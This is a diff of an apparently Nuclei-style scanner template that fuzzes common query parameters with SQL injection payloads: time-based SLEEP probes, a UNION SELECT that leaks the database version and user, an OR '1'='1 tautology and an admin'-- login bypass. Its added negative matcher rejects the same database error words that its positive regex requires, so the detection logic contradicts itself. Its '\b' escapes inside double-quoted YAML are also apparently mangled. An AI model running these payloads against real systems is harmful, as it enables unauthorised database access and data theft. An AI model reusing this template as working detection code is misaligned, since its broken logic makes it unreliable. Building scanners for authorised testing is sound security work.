@@ -1,17 +1,36 @@
 id: THENAWABX_CONFIRMED_SQLI
 info:
-  name: 💉 Nawab-Confirmed-SQLi-Hunter 💉
+  name: Nawab-Confirmed-SQLi-Hunter
   author: thenawabx
   severity: critical
 
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}?id=1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"
-      - "{{BaseURL}}?id=1\" AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"
-      - "{{BaseURL}}?id=1' UNION SELECT NULL,@@version,DATABASE(),USER()--"
-      - "{{BaseURL}}?query=1' OR '1'='1"
-      - "{{BaseURL}}?user=admin'--"
+  - pre-condition:
+      - expr: "queue.has_params"
+
+    payloads:
+      sqli_payloads:
+        - "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"
+        - "1\" AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"
+        - "1' UNION SELECT NULL,@@version,DATABASE(),USER()--"
+        - "1' OR '1'='1"
+        - "admin'--"
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: multiple
+        keys:
+          - "id"
+          - "query"
+          - "user"
+          - "select"
+          - "search"
+          - "pid"
+          - "category"
+          - "item"
+        fuzz:
+          - "{{sqli_payloads}}"
 
     stop-at-first-match: true
     matchers-condition: and
@@ -23,13 +42,25 @@ http:
       - type: regex
         part: body
         regex:
-          - "(SQL syntax.*?MySQL|Warning.*?mysqli_query|PostgreSQL.*?ERROR|SQLite/JDBCDriver|Oracle error.*?ORA-[0-9]+)"
+          - "(?i)(SQL syntax.*?MySQL|Warning.*?mysqli_query|PostgreSQL.*?ERROR|SQLite/JDBCDriver|Oracle error.*?ORA-[0-9]+|Syntax error in SQL statement|Unclosed quotation mark after the character string)"
           - "(?i)(database_user|database_name|database_version)"
-          - "(5\\.[0-9]+\\.[0-9]+|8\\.[0-9]+\\.[0-9]+)"
+          - "\b(5\.[0-9]+\.[0-9]+|8\.[0-9]+\.[0-9]+)\b"
+        condition: or
+
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "sql syntax"
+          - "mysql"
+          - "postgresql"
+          - "sqlite"
+          - "oracle"
+        case-insensitive: true
         condition: or
 
     extractors:
       - type: regex
         part: body
         regex:
-          - "(MySQL|PostgreSQL|Oracle|SQLite|MariaDB) [0-9]+\\.[0-9]+\\.[0-9]+"
+          - "(?i)(MySQL|PostgreSQL|Oracle|SQLite|MariaDB)\s*[0-9]+\.[0-9]+\.[0-9]+"
